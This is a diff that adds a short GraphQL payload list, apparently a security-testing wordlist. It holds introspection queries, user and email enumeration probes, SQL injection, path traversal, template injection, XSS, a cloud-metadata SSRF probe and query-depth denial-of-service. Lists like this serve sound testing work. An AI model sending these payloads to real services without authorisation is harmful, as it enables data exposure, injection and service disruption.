@@ -1,0 +1,16 @@
+# GraphQL advanced payloads
+query { __schema { types { name fields { name } } } }
+query { __type(name:"User") { name fields { name type { name } } } }
+query IntrospectionQuery { __schema { queryType { name } mutationType { name } } }
+mutation { __typename }
+query { node(id:"1") { id ... on User { email role } } }
+query { user(id:"1") { id email role tenantId } }
+query { users(first:1000) { edges { node { id email role } } } }
+query { search(q:"' OR '1'='1") { id name } }
+query { user(id:"../../admin") { id email } }
+query { user(id:"1 OR 1=1") { id email } }
+query { user(id:"{{7*7}}") { id name } }
+query { user(id:"<script>alert(1)</script>") { id name } }
+query { user(id:"http://169.254.169.254/") { id name } }
+query { a:user(id:"1"){id} b:user(id:"2"){id} c:user(id:"3"){id} }
+query Deep { a { b { c { d { e { f { __typename } } } } } } }
